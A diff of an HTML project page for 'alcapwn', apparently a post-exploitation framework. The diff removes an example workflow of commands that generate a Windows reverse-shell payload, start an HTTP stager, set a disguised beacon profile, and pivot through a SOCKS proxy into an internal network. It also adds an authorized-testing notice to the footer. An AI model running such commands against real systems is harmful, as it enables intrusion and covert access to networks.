-    <div class="usage-block" style="margin-top: 24px;">
-      <pre><span class="cmd-comment"># Example future workflow</span>
-
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">generate</span> <span class="cmd-arg">windows --format exe --lhost 0.0.0.0 --lport 4444 --output shell.exe</span>
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">stager</span> <span class="cmd-arg">http --port 8080 --endpoint /update</span>
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">profile</span> <span class="cmd-arg">create browser --user-agent "Mozilla/5.0" --beacon 60s</span>
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">pivot</span> <span class="cmd-arg">add 1 --local 1080 --remote 192.168.1.0/24</span>
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">proxy</span> <span class="cmd-arg">start 1080</span>  <span class="cmd-comment"># SOCKS5 proxy on localhost:1080</span></pre>
-    </div>
   </div>
 </section>
 
-<!-- ── Footer ────────────────────────────────────────────── -->
+<!-- ── Footer ────────────��───────────────────────────────── -->
 <footer>
   <div class="container">
     <div class="footer-inner">
-      <span>alcapwn &mdash; MIT license</span>
+      <span>alcapwn &mdash; MIT license &mdash; for authorized security testing only</span>
       <div class="footer-links">
         <a href="https://github.com/exec/alcapwn">GitHub</a>
         <a href="https://github.com/exec/alcapwn/releases">Releases</a>
